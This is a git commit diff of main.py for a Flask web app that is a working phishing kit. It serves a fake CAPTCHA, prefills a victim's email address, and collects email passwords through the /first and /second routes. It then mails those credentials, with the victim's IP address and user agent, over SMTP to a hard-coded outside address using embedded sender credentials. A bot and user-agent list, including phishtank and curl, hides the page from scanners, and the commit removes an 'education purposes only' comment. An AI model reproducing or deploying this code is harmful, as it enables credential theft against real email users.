b6a0bb5f2fe13750d3fa06ed4bebcc060f20717a
danicodehouse <119807915+danicodehouse@users.noreply.github.com>
2024-01-31 02:03:43 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,13 +1,13 @@
-from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
-import secrets
-import random
+from flask import Flask, request, abort, render_template, session, redirect, url_for
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
-import smtplib, ssl
+import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-# made for education purposes only
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
@@ -15,79 +15,74 @@ secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
 
 bot_user_agents = [
-'Googlebot', 
-'Baiduspider', 
-'ia_archiver',
-'R6_FeedFetcher', 
-'NetcraftSurveyAgent', 
-'Sogou web spider',
-'bingbot', 
-'Yahoo! Slurp', 
-'facebookexternalhit', 
-'PrintfulBot',
-'msnbot', 
-'Twitterbot', 
-'UnwindFetchor', 
-'urlresolver', 
-'Butterfly', 
-'TweetmemeBot',
-'PaperLiBot',
-'MJ12bot',
-'AhrefsBot',
-'Exabot',
-'Ezooms',
-'YandexBot',
-'SearchmetricsBot',
-'phishtank',
-'PhishTank',
-'picsearch',
-'TweetedTimes Bot',
-'QuerySeekerSpider',
-'ShowyouBot',
-'woriobot',
-'merlinkbot',
-'BazQuxBot',
-'Kraken',
-'SISTRIX Crawler',
-'R6_CommentReader',
-'magpie-crawler',
-'GrapeshotCrawler',
-'PercolateCrawler',
-'MaxPointCrawler',
-'R6_FeedFetcher',
-'NetSeer crawler',
-'grokkit-crawler',
-'SMXCrawler',
-'PulseCrawler',
-'Y!J-BRW',
-'80legs.com/webcrawler',
-'Mediapartners-Google', 
-'Spinn3r', 
-'InAGist', 
-'Python-urllib', 
-'NING', 
-'TencentTraveler',
-'Feedfetcher-Google', 
-'mon.itor.us', 
-'spbot', 
-'Feedly',
-'bot',
-'curl',
-"spider",
-"crawler"
+    'Googlebot', 
+    'Baiduspider', 
+    'ia_archiver',
+    'R6_FeedFetcher', 
+    'NetcraftSurveyAgent', 
+    'Sogou web spider',
+    'bingbot', 
+    'Yahoo! Slurp', 
+    'facebookexternalhit', 
+    'PrintfulBot',
+    'msnbot', 
+    'Twitterbot', 
+    'UnwindFetchor', 
+    'urlresolver', 
+    'Butterfly', 
+    'TweetmemeBot',
+    'PaperLiBot',
+    'MJ12bot',
+    'AhrefsBot',
+    'Exabot',
+    'Ezooms',
+    'YandexBot',
+    'SearchmetricsBot',
+    'phishtank',
+    'PhishTank',
+    'picsearch',
+    'TweetedTimes Bot',
+    'QuerySeekerSpider',
+    'ShowyouBot',
+    'woriobot',
+    'merlinkbot',
+    'BazQuxBot',
+    'Kraken',
+    'SISTRIX Crawler',
+    'R6_CommentReader',
+    'magpie-crawler',
+    'GrapeshotCrawler',
+    'PercolateCrawler',
+    'MaxPointCrawler',
+    'R6_FeedFetcher',
+    'NetSeer crawler',
+    'grokkit-crawler',
+    'SMXCrawler',
+    'PulseCrawler',
+    'Y!J-BRW',
+    '80legs.com/webcrawler',
+    'Mediapartners-Google', 
+    'Spinn3r', 
+    'InAGist', 
+    'Python-urllib', 
+    'NING', 
+    'TencentTraveler',
+    'Feedfetcher-Google', 
+    'mon.itor.us', 
+    'spbot', 
+    'Feedly',
+    'bot',
+    'curl',
+    "spider",
+    "crawler"
 ]
 
 @app.route('/', methods=['GET', 'POST'])
 def captcha():
-
     if request.method == 'GET':
-
         if 'passed_captcha' in session and session['passed_captcha']:
-
-            # CAPTCHA has already been passed, redirect to success page
             return redirect(url_for('success'))
 
-        # Generate a random 4-digit code
         code = random.randint(1000, 9999)
         colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
         color = random.choice(colors)
@@ -98,21 +93,16 @@ def captcha():
         session['ins'] = userdomain
         return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
     elif request.method != 'GET':
-
         user_input = request.form['code']
 
         if user_input == session['code']:
-            
-            # User input matches the code, set the flag and redirect to success page
             session['passed_captcha'] = True
             return redirect(url_for('success'))
         else:
-            # User input does not match the code, generate a new code and render the CAPTCHA page with an error message
             code = random.randint(1000, 9999)
             colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
             color = random.choice(colors)
             session['code'] = str(code)
-
             return render_template('captcha.html', code=code, color=color, error=True)
 
 @app.route('/success')
@@ -123,36 +113,35 @@ def success():
     else:
         return redirect(url_for('captcha'))
 
-
 @app.route("/route2")
 def route2():
     web_param = request.args.get('web')
     if web_param:
         session['eman'] = web_param
         session['ins'] = web_param[web_param.index('@') + 1:]
+
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
+# ... (rest of the code)
+# ... (previous code)
 
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "ghost@newupdateishere.com"
         receiver_email = "Kimkun543@outlook.com"
         password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
+        
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW SK API ... 1"
         message["From"] = sender_email
         message["To"] = receiver_email
+        
         text = """\
         Hi,
         How are you?
@@ -163,33 +152,30 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
+        
         with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
+        
         return redirect(url_for('benza', web=session.get('eman')))
-
-
 
 @app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "ghost@newupdateishere.com"
         receiver_email = "Kimkun543@outlook.com"
         password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
+        
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW SK API ... 2"
         message["From"] = sender_email
         message["To"] = receiver_email
+        
         text = """\
         Hi,
         How are you?
@@ -200,12 +186,12 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
+        
         with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
+        
         return redirect(url_for('lasmo'))
-
-
 
 @app.route("/benzap", methods=['GET'])
 def benza():
@@ -216,7 +202,7 @@ def benza():
 
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
-    userip = request.headers.get("X-Forwarded-For")
+    userip = request.headers.get("X-Forwarded-For") or request.remote_addr
     useragent = request.headers.get("User-Agent")
     
     if useragent in bot_user_agents:
@@ -227,4 +213,4 @@ def lasmo():
     return render_template('main.html', dman=dman)
 
 if __name__ == '__main__':
-	app.run(host="0.0.0.0", port=3000)
+    app.run(host="0.0.0.0", port=3000)
